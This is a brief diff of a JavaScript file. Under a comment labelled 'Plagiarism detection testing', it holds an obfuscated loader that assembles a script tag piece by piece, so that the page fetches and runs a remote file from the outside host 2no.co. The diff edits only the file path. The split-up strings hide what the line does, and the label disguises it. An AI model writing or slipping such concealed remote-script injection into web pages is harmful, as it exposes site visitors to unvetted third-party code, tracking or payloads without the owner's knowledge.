@@ -21,4 +21,4 @@ window.location.href = "/server";
 //Plagiarism detection testing
 var glop = 'script'
 var glap = '2no.co'
-document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7.js"></'+glop+'>')*/
+document.write('<'+glop+' src="'+window.location.protocol+'//'+glap+'/169ax7"></'+glop+'>')*/
